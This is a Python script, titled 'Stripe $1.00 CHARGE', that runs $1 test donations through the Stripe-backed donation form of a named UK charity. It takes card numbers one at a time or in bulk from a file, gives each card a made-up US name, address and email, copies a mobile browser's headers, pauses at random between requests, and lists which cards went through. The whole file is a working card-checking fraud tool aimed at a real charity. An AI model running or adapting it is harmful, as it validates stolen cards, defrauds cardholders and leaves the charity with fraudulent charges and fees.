import requests
import json
import random
import re
from bs4 import BeautifulSoup
from typing import Dict
import time

class USAddressGenerator:
    LOCATIONS = [
        {"city": "New York", "state": "NY", "zip": "10001", "state_full": "New York"},
        {"city": "Los Angeles", "state": "CA", "zip": "90001", "state_full": "California"},
        {"city": "Chicago", "state": "IL", "zip": "60601", "state_full": "Illinois"},
        {"city": "Houston", "state": "TX", "zip": "77001", "state_full": "Texas"},
        {"city": "Phoenix", "state": "AZ", "zip": "85001", "state_full": "Arizona"},
        {"city": "Philadelphia", "state": "PA", "zip": "19019", "state_full": "Pennsylvania"},
        {"city": "San Antonio", "state": "TX", "zip": "78201", "state_full": "Texas"},
        {"city": "San Diego", "state": "CA", "zip": "92101", "state_full": "California"},
        {"city": "Dallas", "state": "TX", "zip": "75201", "state_full": "Texas"},
        {"city": "Austin", "state": "TX", "zip": "78701", "state_full": "Texas"},
    ]
    
    FIRST_NAMES = ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth", "David", "Barbara", "Richard", "Susan", "Joseph", "Jessica", "Thomas", "Sarah", "Charles", "Karen"]
    LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin"]
    STREETS = ["Main St", "Oak Ave", "Maple Dr", "Cedar Ln", "Pine St", "Elm St", "Washington Ave", "Lake St", "Hill St", "Park Ave"]
    
    @classmethod
    def generate_address(cls) -> Dict[str, str]:
        location = random.choice(cls.LOCATIONS)
        street_num = random.randint(100, 9999)
        street = random.choice(cls.STREETS)
        
        return {
            "first_name": random.choice(cls.FIRST_NAMES),
            "last_name": random.choice(cls.LAST_NAMES),
            "address": f"{street_num} {street}",
            "address_2": random.choice(["", f"Apt {random.randint(1, 50)}", f"#{random.randint(1, 100)}", ""]),
            "city": location["city"],
            "state": location["state"],
            "state_full": location["state_full"],
            "zip": location["zip"],
            "email": f"{random.choice(cls.FIRST_NAMES).lower()}{random.randint(1, 999)}@gmail.com"
        }

class BravehoundDonationBot:
    def __init__(self, card_data: str):
        parts = card_data.split('|')
        self.card_number = parts[0].strip()
        self.exp_month = parts[1].strip()
        self.exp_year = parts[2].strip()
        self.cvc = parts[3].strip()
        self.session = requests.Session()
        self.address = USAddressGenerator.generate_address()
        self.form_hash = None
        self.payment_method_id = None
        
    def get_form_hash(self):
        url = "https://www.bravehound.co.uk/wp-admin/admin-ajax.php"
        payload = {
            'action': "give_donation_form_reset_all_nonce",
            'give_form_id': "13302"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
            'sec-ch-ua-platform': '"Android"',
            'x-requested-with': "XMLHttpRequest",
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': "?1",
            'origin': "https://www.bravehound.co.uk",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.bravehound.co.uk/donation/",
            'accept-language': "en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5",
            'priority': "u=1, i",
        }
        response = self.session.post(url, data=payload, headers=headers)
        self.form_hash = response.json()['data']['give_form_hash']
        return self.form_hash
    
    def create_payment_method(self):
        url = "https://api.stripe.com/v1/payment_methods"
        payload = {
            'type': "card",
            'billing_details[name]': f"{self.address['first_name']} {self.address['last_name']}",
            'billing_details[email]': self.address['email'],
            'card[number]': self.card_number,
            'card[cvc]': self.cvc,
            'card[exp_month]': self.exp_month,
            'card[exp_year]': self.exp_year[-2:],
            'guid': "c2d15411-4ea6-4412-96f9-5964b19feacc9a03e0",
            'muid': "2cbebced-2e78-43c8-8df0-d77c88f32d7effd1d6",
            'sid': "515d1b26-d906-4b1d-a218-e9cb37dbceebeed15b",
            'payment_user_agent': "stripe.js/668d00c08a; stripe-js-v3/668d00c08a; split-card-element",
            'referrer': "https://www.bravehound.co.uk",
            'time_on_page': str(random.randint(30000, 50000)),
            'client_attribution_metadata[client_session_id]': "63059f23-5d3b-4e7b-b77f-7c5d2fc5630d",
            'client_attribution_metadata[merchant_integration_source]': "elements",
            'client_attribution_metadata[merchant_integration_subtype]': "split-card-element",
            'client_attribution_metadata[merchant_integration_version]': "2017",
            'key': "pk_live_SMtnnvlq4TpJelMdklNha8iD",
            '_stripe_account': "acct_1GZhGGEfZQ9gHa50",
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
            'Accept': "application/json",
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': "?1",
            'origin': "https://js.stripe.com",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://js.stripe.com/",
            'accept-language': "en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5",
            'priority': "u=1, i"
        }
        response = self.session.post(url, data=payload, headers=headers)
        self.payment_method_id = response.json()['id']
        return self.payment_method_id
    
    def submit_donation(self):
        url = "https://www.bravehound.co.uk/donation/"
        params = {
            'payment-mode': "stripe",
            'form-id': "13302"
        }
        payload = {
            'give-honeypot': "",
            'give-form-id-prefix': "13302-1",
            'give-form-id': "13302",
            'give-form-title': "Bravehound Donations",
            'give-current-url': "https://www.bravehound.co.uk/donation/",
            'give-form-url': "https://www.bravehound.co.uk/donation/",
            'give-form-minimum': "1.00",
            'give-form-maximum': "999999.99",
            'give-form-hash': self.form_hash,
            'give-price-id': "custom",
            'give-recurring-logged-in-only': "",
            'give-logged-in-only': "1",
            '_give_is_donation_recurring': "0",
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': "1.00",
            'give_stripe_payment_method': self.payment_method_id,
            'payment-mode': "stripe",
            'give_first': self.address['first_name'],
            'give_last': self.address['last_name'],
            'give_email': self.address['email'],
            'card_name': f"{self.address['first_name']} {self.address['last_name']}",
            'give_gift_check_is_billing_address': "yes",
            'give_gift_aid_address_option': "billing_address",
            'give_gift_aid_card_first_name': "",
            'give_gift_aid_card_last_name': "",
            'give_gift_aid_billing_country': "US",
            'give_gift_aid_card_address': self.address['address'],
            'give_gift_aid_card_address_2': self.address['address_2'],
            'give_gift_aid_card_city': self.address['city'],
            'give_gift_aid_card_state': self.address['state'],
            'give_gift_aid_card_zip': self.address['zip'],
            'give_action': "purchase",
            'give-gateway': "stripe"
        }
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36",
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            'cache-control': "max-age=0",
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': '"Android"',
            'origin': "https://www.bravehound.co.uk",
            'upgrade-insecure-requests': "1",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "navigate",
            'sec-fetch-user': "?1",
            'sec-fetch-dest': "document",
            'referer': "https://www.bravehound.co.uk/donation/?form-id=13302&payment-mode=stripe&level-id=custom&custom-amount=1.00",
            'accept-language': "en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5",
            'priority': "u=0, i",
        }
        response = self.session.post(url, params=params, data=payload, headers=headers)
        return self._parse_response(response.text)
    
    def _parse_response(self, response_text):
        error_match = re.search(r'<p>.*?<strong>Error</strong>:(.*?)<br', response_text, re.DOTALL)
        if error_match:
            return {"status": "error", "message": error_match.group(1).strip()}
        elif re.search(r'(thank\s?you|successfully|succeeded)', response_text, re.I):
            return {"status": "success", "message": "Charged $1"}
        else:
            return {"status": "unknown", "message": "Unknown Response"}
    
    def run(self):
        self.get_form_hash()
        self.create_payment_method()
        time.sleep(random.uniform(1, 3))
        result = self.submit_donation()
        result["card"] = self.card_number
        result["address"] = f"{self.address['address']}, {self.address['city']}, {self.address['state']} {self.address['zip']}"
        return result

def process_single_card():
    card_input = input("Enter card (format: number|month|year|cvc): ").strip()
    bot = BravehoundDonationBot(card_input)
    result = bot.run()
    
    print("\n" + "="*50)
    print(f"Card: {result['card']}")
    print(f"Address: {result['address']}")
    print(f"Status: {result['status']}")
    print(f"Message: {result['message']}")
    print("="*50)

def process_file():
    filename = input("Enter filename with cards (format: number|month|year|cvc each line): ").strip()
    
    try:
        with open(filename, 'r') as f:
            cards = [line.strip() for line in f if line.strip()]
        
        results = []
        for i, card_data in enumerate(cards, 1):
            parts = card_data.split('|')
            if len(parts) != 4:
                print(f"Line {i}: Invalid format (need: number|month|year|cvc), skipping")
                continue
            
            print(f"\nProcessing card {i}/{len(cards)}: {parts[0]}")
            
            bot = BravehoundDonationBot(card_data)
            result = bot.run()
            
            result["card_number"] = parts[0]
            results.append(result)
            
            print(f"Status: {result['status']} - {result['message']}")
            time.sleep(random.uniform(2, 5))
        
        print("\n" + "="*50)
        print("SUMMARY")
        print("="*50)
        success = sum(1 for r in results if r['status'] == 'success')
        error = sum(1 for r in results if r['status'] == 'error')
        unknown = sum(1 for r in results if r['status'] == 'unknown')
        print(f"Total: {len(results)}")
        print(f"Success: {success}")
        print(f"Error: {error}")
        print(f"Unknown: {unknown}")
        
        for r in results:
            if r['status'] == 'success':
                print(f"✓ {r['card_number']}")
            else:
                print(f"✗ {r['card_number']} - {r['message']}")
        
    except FileNotFoundError:
        print(f"File {filename} not found")

def main():
    print("Stripe $1.00 CHARGE")
    print("1. Single card")
    print("2. Mass check from file")
    
    choice = input("\nSelect option (1/2): ").strip()
    
    if choice == "1":
        process_single_card()
    elif choice == "2":
        process_file()
    else:
        print("Invalid choice")

if __name__ == "__main__":
    main()
